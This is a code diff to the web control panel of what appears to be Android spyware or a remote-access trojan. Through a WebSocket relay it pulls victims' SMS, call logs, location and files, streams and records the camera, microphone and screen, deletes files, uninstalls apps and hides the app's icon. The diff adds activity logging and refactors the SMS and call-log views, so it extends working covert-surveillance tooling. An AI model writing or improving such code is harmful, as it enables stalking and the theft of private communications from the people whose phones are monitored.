@@ -76,25 +76,7 @@
             #sidebar.show {
                 transform: translateX(0);
             }
-            .phone-frame{
-                flex:1;
-                display:flex;
-                justify-content:center;
-                align-items:center;
-                background:black;
-                overflow:hidden;
-            }
-
-            .phone-frame video{
-                width:100%;
-                height:100%;
-                object-fit:contain;
-            }
-
-            .popup-controls button{
-                width:60px;
-                height:60px;
-            }
+            
             .sidebar-overlay {
                 display: none;
                 position: fixed;
@@ -774,16 +756,22 @@
             display: flex;
         }
 
-        ..mobile-popup{
-            width:min(90vw,1100px);
-            aspect-ratio:9/16;
-            display:flex;
-            flex-direction:column;
-            background:#0f0f0f;
-            border-radius:26px;
-            border:4px solid #2e2e2e;
-            box-shadow:var(--shadow-lg);
-            overflow:hidden;
+        .mobile-popup {
+            width: 360px;
+            height: 640px;
+            display: flex;
+            flex-direction: column;
+            background: #0f0f0f;
+            border-radius: 26px;
+            border: 4px solid #2e2e2e;
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+            flex-shrink: 0;
+        }
+
+        .mobile-popup.landscape {
+            width: 640px;
+            height: 360px;
         }
 
         .phone-frame {
@@ -794,7 +782,7 @@
             background: black;
             overflow: hidden;
             width: 100%;
-            height: calc(640px - 84px);
+            height: calc(100% - 84px);
         }
 
         .phone-frame video {
@@ -859,6 +847,23 @@
                 justify-content: flex-start;
                 padding: 10px;
             }
+            
+            .mobile-popup {
+                width: 320px;
+                height: 570px;
+            }
+            
+            .popup-controls button {
+                width: 50px;
+                height: 50px;
+                min-width: 50px;
+                font-size: 24px;
+            }
+            
+            .popup-controls button.close-btn {
+                width: 60px;
+                min-width: 60px;
+            }
         }
 
         body.modal-open #sidebar,
@@ -908,15 +913,33 @@
             color: white;
             border-color: var(--primary-color);
         }
+
+        .timeline-item {
+            padding: 12px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .timeline-item:hover {
+            background: #f5f9ff;
+        }
+        
+        .timeline-time {
+            color: var(--text-muted);
+            font-size: 12px;
+        }
+        
+        .timeline-action {
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
 
 <div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>
-<button onclick="showActivityTimeline()">
-<span>📜</span>
-<span>Activity Timeline</span>
-</button>
+
 <div id="screenModalOverlay" class="modal-overlay">
     <div class="mobile-popup" id="mobilePopup">
         <div class="phone-frame">
@@ -939,6 +962,7 @@
     <div class="section">
         <div class="section-title">Device</div>
         <button onclick="getInstalledApps()"><span>📱</span> <span>Installed Apps</span></button>
+        <button onclick="showActivityTimeline()"><span>📜</span> <span>Activity Timeline</span></button>
     </div>
 
     <div class="section">
@@ -1025,7 +1049,6 @@
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-    let activityTimeline = [];
     // ---------- GLOBALS ----------
     const WS_URL = "wss://mirror-view.onrender.com";
     let ws = null;
@@ -1058,6 +1081,9 @@
     let audioMediaRecorder = null;
     let audioRecordedChunks = [];
 
+    // Activity timeline
+    let activityTimeline = [];
+
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
 
@@ -1068,10 +1094,32 @@
     const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
     const modalCloseBtn = document.getElementById('modalCloseBtn');
 
-    function logActivity(action){
-    const time = new Date().toLocaleTimeString();
-    activityTimeline.unshift({time,action});
-    if(activityTimeline.length>100) activityTimeline.pop();
+    function logActivity(action) {
+        const time = new Date().toLocaleTimeString();
+        activityTimeline.unshift({ time, action });
+        if (activityTimeline.length > 100) activityTimeline.pop();
+        console.log('Activity:', action);
+    }
+
+    function showActivityTimeline() {
+        logActivity('Viewed activity timeline');
+        let html = '<h3>📜 Activity Timeline</h3>';
+        html += '<div style="max-height:500px;overflow:auto;">';
+
+        if (activityTimeline.length === 0) {
+            html += '<p style="padding:20px;text-align:center;color:#7b8a9b;">No activities recorded yet</p>';
+        } else {
+            activityTimeline.forEach(e => {
+                html += `
+                <div class="timeline-item">
+                    <span class="timeline-action">${e.action}</span>
+                    <span class="timeline-time">${e.time}</span>
+                </div>`;
+            });
+        }
+
+        html += '</div>';
+        panel.innerHTML = html;
     }
     
     function getFormattedDateTime() {
@@ -1099,27 +1147,9 @@
         };
         ws.send(JSON.stringify(payload));
         console.log('📤 Signaling sent:', msg.type);
+        logActivity(`Signaling: ${msg.type}`);
     }
 
-    function showActivityTimeline(){
-    let html='<h3>Activity Timeline</h3>';
-    html+='<div style="max-height:500px;overflow:auto;">';
-
-    activityTimeline.forEach(e=>{
-        html+=`
-        <div style="
-            padding:10px;
-            border-bottom:1px solid #e0e4e8;
-            display:flex;
-            justify-content:space-between;">
-            <span>${e.action}</span>
-            <span style="color:#7b8a9b">${e.time}</span>
-        </div>`;
-    });
-
-    html+='</div>';
-    panel.innerHTML=html;
-}
     function createPeerConnection(streamType, onTrackCallback, useMic = false) {
         const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
 
@@ -1151,8 +1181,8 @@
                     screenActive = false;
                     document.getElementById('screenBtn').innerText = 'Start Screen';
                     closeScreenModal();
+                    logActivity('Screen share disconnected');
                 } else if (streamType === 'audio') {
-                    // Auto-stop audio if disconnected
                     stopLiveAudio();
                 }
             }
@@ -1221,6 +1251,7 @@
             screenActive = false;
             closeScreenModal();
             sendSignalingMessage({ type: 'STOP_SCREEN' });
+            logActivity('Stopped screen share');
         } else {
             openScreenModal();
             modalVideo.srcObject = null;
@@ -1240,6 +1271,7 @@
                 });
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
                 screenActive = true;
+                logActivity('Started screen share');
                 showNotification("Screen sharing started. A system notification will appear – this is normal.");
             } catch (e) {
                 console.error('Screen share failed:', e);
@@ -1266,6 +1298,7 @@
             a.href = url;
             a.click();
             URL.revokeObjectURL(url);
+            logActivity('Screen snapshot captured');
         }, 'image/png');
     }
 
@@ -1276,6 +1309,7 @@
         if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
             screenMediaRecorder.stop();
             modalRecordBtn.innerText = '🔴';
+            logActivity('Screen recording stopped');
         } else {
             if (!modalVideo.srcObject) {
                 alert('Phone Screen Off');
@@ -1291,6 +1325,7 @@
             } else {
                 startScreenRecording(canvas, ctx, stream);
             }
+            logActivity('Screen recording started');
         }
     }
 
@@ -1318,6 +1353,7 @@
             a.click();
             URL.revokeObjectURL(url);
             canvasStream.getTracks().forEach(track => track.stop());
+            logActivity('Screen recording saved');
         };
         screenMediaRecorder.start();
         modalRecordBtn.innerText = '🟢';
@@ -1326,6 +1362,7 @@
     function toggleFullscreen() {
         if (!document.fullscreenElement) {
             modalVideo.requestFullscreen().catch(err => console.error('Fullscreen error:', err));
+            logActivity('Screen share fullscreen');
         } else {
             document.exitFullscreen();
         }
@@ -1364,6 +1401,7 @@
                 camera: camera,
                 mic: useMic
             });
+            logActivity(`Started live camera: ${camera}`);
         } catch (e) {
             console.error('Live camera start failed:', e);
             showNotification('Failed to start camera stream');
@@ -1379,9 +1417,9 @@
         }
         sendSignalingMessage({ type: 'STOP_CAMERA' });
         panel.innerHTML = 'Ready.';
+        logActivity('Stopped live camera');
     }
 
-    // Updated Live Audio with recording
     async function toggleLiveAudio() {
         if (!currentDeviceId) {
             alert('Please select a device first');
@@ -1426,6 +1464,7 @@
             });
             document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
             document.getElementById('stopLiveAudioBtn').style.display = 'block';
+            logActivity('Started live audio');
         } catch (e) {
             console.error('Live audio start failed:', e);
             showNotification('Failed to start audio stream');
@@ -1435,7 +1474,6 @@
     }
 
     function stopLiveAudio() {
-        // Stop any ongoing audio recording
         if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
             stopAudioRecording();
         }
@@ -1448,9 +1486,9 @@
         document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
         document.getElementById('stopLiveAudioBtn').style.display = 'none';
         panel.innerHTML = 'Ready.';
+        logActivity('Stopped live audio');
     }
 
-    // Audio recording functions
     function toggleAudioRecording() {
         const audioEl = document.getElementById('liveAudio');
         if (!audioEl || !audioEl.srcObject) {
@@ -1482,15 +1520,18 @@
             a.click();
             URL.revokeObjectURL(url);
             audioRecordedChunks = [];
+            logActivity('Audio recording saved');
         };
         audioMediaRecorder.start();
         showNotification('Recording started');
+        logActivity('Audio recording started');
     }
 
     function stopAudioRecording() {
         if (audioMediaRecorder && audioMediaRecorder.state === 'recording') {
             audioMediaRecorder.stop();
             audioMediaRecorder = null;
+            logActivity('Audio recording stopped');
         }
     }
 
@@ -1517,6 +1558,7 @@
         ws.send(JSON.stringify(payload));
         panel.innerHTML = `📤 Command sent to ${devices.get(currentDeviceId)?.name || 'device'}: ${command}`;
         pendingCommand = command;
+        logActivity(`Command sent: ${command}`);
         setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
 
@@ -1533,6 +1575,7 @@
 
         ws.send(msg);
         panel.innerHTML = `📤 Plain text sent: ${msg}`;
+        logActivity(`Plain text: ${msg}`);
     }
 
     function handleDeviceRegistration(data) {
@@ -1550,6 +1593,7 @@
 
         updateDeviceSelector();
         showNotification(`New device connected: ${deviceName}`);
+        logActivity(`Device registered: ${deviceName}`);
 
         if (devices.size === 1) {
             currentDeviceId = deviceId;
@@ -1601,6 +1645,7 @@
         }
 
         showNotification(`Switched to ${devices.get(deviceId)?.name}`);
+        logActivity(`Switched to device: ${devices.get(deviceId)?.name}`);
     }
 
     function showWelcomeMessage(show) {
@@ -1667,25 +1712,28 @@
 
         html += '</div>';
         panel.innerHTML = html;
+        logActivity('Displayed installed apps');
     }
 
     function uninstallApp(packageName) {
         if (confirm(`Uninstall ${packageName}?`)) {
             sendCommand('UNINSTALL_APP', { package: packageName });
+            logActivity(`Uninstall requested: ${packageName}`);
         }
     }
 
     function openApp(packageName) {
         sendCommand('OPEN_APP', { package: packageName });
+        logActivity(`Open app: ${packageName}`);
     }
 
     function deleteFile(path) {
         if (confirm(`Delete ${path}?`)) {
             sendCommand('DELETE_FILE', { path: path });
+            logActivity(`Delete file: ${path}`);
         }
     }
 
-    // Helper to parse data if it's a string
     function parseDataField(data) {
         if (typeof data === 'string') {
             try {
@@ -1744,6 +1792,7 @@
             case 'FILE_DELETED':
                 showNotification('File deleted');
                 sendCommand('LIST_FILES', { path: currentPath });
+                logActivity('File deleted confirmed');
                 break;
 
             case 'DEVICE_REGISTERED':
@@ -1753,53 +1802,63 @@
             case 'SMS_DATA':
                 dataType = 'sms';
                 currentData = parseDataField(json.data);
-                renderTable();
+                renderSMS();
+                logActivity('SMS data received');
                 break;
 
             case 'CALL_LOGS':
                 dataType = 'call';
                 currentData = parseDataField(json.data);
-                renderTable();
+                renderCallLogs();
+                logActivity('Call logs received');
                 break;
 
             case 'FILE_LIST':
                 dataType = 'file';
                 currentData = parseDataField(json.data);
                 renderFiles();
+                logActivity('File list received');
                 break;
 
             case 'LOCATION_UPDATE':
                 renderMap(parseDataField(json.data));
+                logActivity('Location update received');
                 break;
 
             case 'CAMERA_IMAGE':
                 displayCapturedImage(json.data);
+                logActivity('Camera image received');
                 break;
 
             case 'AUDIO_RECORDING':
                 showAudio(json.data);
+                logActivity('Audio recording received');
                 break;
 
             case 'ERROR':
                 panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
+                logActivity(`Error: ${json.error}`);
                 break;
 
             case 'APP_HIDDEN':
                 iconHidden = true;
                 document.getElementById('iconBtn').innerText = 'Show Icon';
                 showNotification('App icon hidden');
+                logActivity('App icon hidden');
                 break;
 
             case 'APP_SHOWN':
                 iconHidden = false;
                 document.getElementById('iconBtn').innerText = 'Hide Icon';
                 showNotification('App icon shown');
+                logActivity('App icon shown');
                 break;
 
             case 'SCREEN_SHARE_STARTED':
                 screenActive = true;
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
                 showNotification('Screen share started');
+                logActivity('Screen share started (device)');
                 break;
 
             case 'SCREEN_SHARE_STOPPED':
@@ -1807,6 +1866,7 @@
                 document.getElementById('screenBtn').innerText = 'Start Screen';
                 if (screenPC) { screenPC.close(); screenPC = null; }
                 showNotification('Screen share stopped');
+                logActivity('Screen share stopped (device)');
                 break;
 
             default:
@@ -1818,11 +1878,11 @@
                 } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
                     dataType = 'sms';
                     currentData = json;
-                    renderTable();
+                    renderSMS();
                 } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
                     dataType = 'call';
                     currentData = json;
-                    renderTable();
+                    renderCallLogs();
                 } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
                     renderMap(json);
                 }
@@ -1850,13 +1910,13 @@
             try {
                 currentData = JSON.parse(msg.substring(9));
                 dataType = 'sms';
-                renderTable();
+                renderSMS();
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CALL_DATA:")) {
             try {
                 currentData = JSON.parse(msg.substring(10));
                 dataType = 'call';
-                renderTable();
+                renderCallLogs();
             } catch (err) { console.error(err); }
         } else if (msg.startsWith("CAMERA_IMAGE:")) {
             const base64 = msg.substring(13);
@@ -1956,6 +2016,7 @@
             a.download = `snapshot_${Date.now()}.png`;
             a.click();
             URL.revokeObjectURL(url);
+            logActivity('Live snapshot taken');
         }, 'image/png');
     }
 
@@ -1968,6 +2029,7 @@
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
             document.getElementById('recordBtn').innerText = 'Record Video';
+            logActivity('Live video recording stopped');
         } else {
             recordedChunks = [];
             const canvas = document.createElement('canvas');
@@ -1979,6 +2041,7 @@
             } else {
                 startCanvasRecording(video, canvas, ctx, stream);
             }
+            logActivity('Live video recording started');
         }
     }
 
@@ -2006,6 +2069,7 @@
             a.click();
             URL.revokeObjectURL(url);
             canvasStream.getTracks().forEach(track => track.stop());
+            logActivity('Live video recording saved');
         };
         mediaRecorder.start();
         document.getElementById('recordBtn').innerText = 'Stop Recording';
@@ -2068,86 +2132,50 @@
         });
     }
 
-    function renderTable() {
+    function renderSMS() {
         if (!currentData || currentData.length === 0) {
-            panel.innerHTML = '<p>No data</p>';
+            panel.innerHTML = '<p>No SMS data</p>';
             return;
         }
 
-        let headers = [], rows = [];
-        if(dataType==='sms'){
+        let html = '<h3>💬 SMS Messages</h3>';
+        html += '<div style="max-height:600px;overflow:auto">';
 
-let html='<div style="max-height:600px;overflow:auto">';
-
-currentData.forEach(s=>{
-html+=`
-<div style="
-padding:12px;
-border-bottom:1px solid #eee;">
-<b>${s.number}</b>
-<div style="font-size:13px;color:#777">${s.date}</div>
-<div>${s.body}</div>
-</div>`;
-});
-
-html+='</div>';
-panel.innerHTML=html;
-return;
-} else if(dataType==='call'){
-
-let html='<div style="max-height:600px;overflow:auto">';
-
-currentData.forEach(c=>{
-html+=`
-<div style="
-padding:12px;
-border-bottom:1px solid #eee;">
-<b>${c.number}</b>
-<div>${c.type}</div>
-<div style="font-size:13px;color:#777">
-${c.date} | ${c.duration}s
-</div>
-</div>`;
-});
-
-html+='</div>';
-panel.innerHTML=html;
-return;
-} else {
-            panel.innerHTML = '<p>Unknown data type</p>';
-            return;
-        }
-
-        const pageSize = 20;
-        const totalPages = Math.ceil(rows.length / pageSize);
-        const start = currentPage * pageSize;
-        const pageRows = rows.slice(start, start + pageSize);
-
-        let html = '<table><thead><tr>';
-        headers.forEach(h => html += `<th>${h}</th>`);
-        html += '</tr></thead><tbody>';
-
-        pageRows.forEach(r => {
-            html += '<tr>';
-            r.forEach(cell => html += `<td>${cell}</td>`);
-            html += '</tr>';
+        currentData.forEach(s => {
+            html += `
+            <div style="padding:12px; border-bottom:1px solid #eee;">
+                <b>${s.number || 'Unknown'}</b>
+                <div style="font-size:13px;color:#777">${s.date || ''}</div>
+                <div>${s.body || ''}</div>
+            </div>`;
         });
-        html += '</tbody></table>';
 
-        if (totalPages > 1) {
-            html += '<div class="pagination">';
-            for (let i = 0; i < totalPages; i++) {
-                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
-            }
-            html += '</div>';
-        }
-
+        html += '</div>';
         panel.innerHTML = html;
     }
 
-    function gotoPage(p) {
-        currentPage = p;
-        renderTable();
+    function renderCallLogs() {
+        if (!currentData || currentData.length === 0) {
+            panel.innerHTML = '<p>No call logs</p>';
+            return;
+        }
+
+        let html = '<h3>📞 Call Logs</h3>';
+        html += '<div style="max-height:600px;overflow:auto">';
+
+        currentData.forEach(c => {
+            html += `
+            <div style="padding:12px; border-bottom:1px solid #eee;">
+                <b>${c.number || 'Unknown'}</b>
+                <div>${c.type || ''}</div>
+                <div style="font-size:13px;color:#777">
+                    ${c.date || ''} | ${c.duration || '0'}s
+                </div>
+            </div>`;
+        });
+
+        html += '</div>';
+        panel.innerHTML = html;
     }
 
     function renderFiles() {
@@ -2259,6 +2287,7 @@ return;
         selectedFiles.forEach(path => {
             sendPlainText('dl ' + path);
         });
+        logActivity(`Downloading ${selectedFiles.length} files`);
     }
 
     function formatBytes(b) {
@@ -2297,6 +2326,7 @@ return;
             console.log('WebSocket connected');
             ws.send('I_AM_WEB');
             setStatus('ONLINE');
+            logActivity('WebSocket connected');
 
             const welcomeMsg = document.getElementById('welcomeMessage');
             if (welcomeMsg) {
@@ -2329,6 +2359,7 @@ return;
             if (window.deviceListInterval) {
                 clearInterval(window.deviceListInterval);
             }
+            logActivity('WebSocket disconnected');
         };
         ws.onerror = (err) => {
             console.error('WebSocket error:', err);
@@ -2361,7 +2392,17 @@ return;
     modalFullscreenBtn.addEventListener('click', toggleFullscreen);
     modalCloseBtn.addEventListener('click', closeScreenModal);
 
-    modalVideo.addEventListener("loadedmetadata", () => {});
+    modalVideo.addEventListener("loadedmetadata", () => {
+        const w = modalVideo.videoWidth;
+        const h = modalVideo.videoHeight;
+        const popup = document.getElementById('mobilePopup');
+        
+        if (h > w) {
+            popup.classList.remove('landscape');
+        } else {
+            popup.classList.add('landscape');
+        }
+    });
 
     function toggleSidebar() {
         const sidebar = document.getElementById('sidebar');
@@ -2404,6 +2445,7 @@ return;
     window.switchDevice = switchDevice;
     window.toggleSidebar = toggleSidebar;
     window.toggleAudioRecording = toggleAudioRecording;
+    window.showActivityTimeline = showActivityTimeline;
 
     document.getElementById('screenShareBtn').addEventListener('click', toggleScreen);
 
@@ -2411,4 +2453,3 @@ return;
 </script>
 </body>
 </html>
-
